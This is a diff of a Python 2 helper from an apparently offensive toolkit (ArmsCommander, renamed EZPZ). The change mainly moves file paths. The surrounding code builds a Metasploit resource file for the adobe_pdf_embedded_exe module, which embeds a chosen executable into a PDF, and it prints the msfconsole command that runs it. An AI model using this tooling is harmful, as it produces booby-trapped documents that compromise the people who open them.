@@ -32,8 +32,8 @@ def ask_user_to_run():
     if question_Run_Now == "Y":
         autorun_pdf_generate()
     elif question_Run_Now == "N":
-        os.system('/root/ArmsCommander/ArmsCommander.py')
-        print 'You can start the PDF-maker script manually by typing: msfconsole -r /root/ArmsCommander/remoteexploits/generate_pdf.rc'
+        os.system('/root/EZPZ/ArmsCommander.py')
+        print 'You can start the PDF-maker script manually by typing: msfconsole -r /root/EZPZ/remoteexploits/generate_pdf.rc'
     else:
         print 'You have entered a invalid option, press "Y" or "N"'
         ask_user_to_run()
@@ -42,10 +42,10 @@ def ask_user_to_run():
 custom_executable = str(raw_input("Enter the PATH of the custom executable you are using: "))
 custom_pdf = str(raw_input("Enter the full path of the custom PDF you are injecting into: "))
 output_pdf = str(raw_input("Make up a filename for output: "))
-makeembeddedpdf_directory = '/root/ArmsCommander/remoteexploits/'
+makeembeddedpdf_directory = '/root/EZPZ/remoteexploits/'
 makeembeddedpdf_name = makeembeddedpdf_directory + 'generate_pdf' + '.rc'
 
-os.system('chmod 777 /root/ArmsCommander/remoteexploits/generate_pdf.rc')
+os.system('chmod 777 /root/EZPZ/remoteexploits/generate_pdf.rc')
 
 # keep getting this dumb errors
 # Traceback (most recent call last):
@@ -54,8 +54,8 @@ os.system('chmod 777 /root/ArmsCommander/remoteexploits/generate_pdf.rc')
 # AttributeError: 'file' object attribute 'write' is read-only
 
 # FIXED it was just syntax error. No ' = ' signs between the write portion. You want to change it to .write('stuff')
-payload_dir = '/root/ArmsCommander/payloads/'
-makeembeddedpdf = open('/root/ArmsCommander/payloads/generate_pdf.rc', 'w')
+payload_dir = '/root/EZPZ/payloads/'
+makeembeddedpdf = open('/root/EZPZ/payloads/generate_pdf.rc', 'w')
 makeembeddedpdf.write('use exploit/windows/fileformat/adobe_pdf_embedded_exe')
 makeembeddedpdf.write('\nset EXENAME ' + custom_executable)
 makeembeddedpdf.write('\nset INFILENAME ' + custom_pdf + '.pdf')
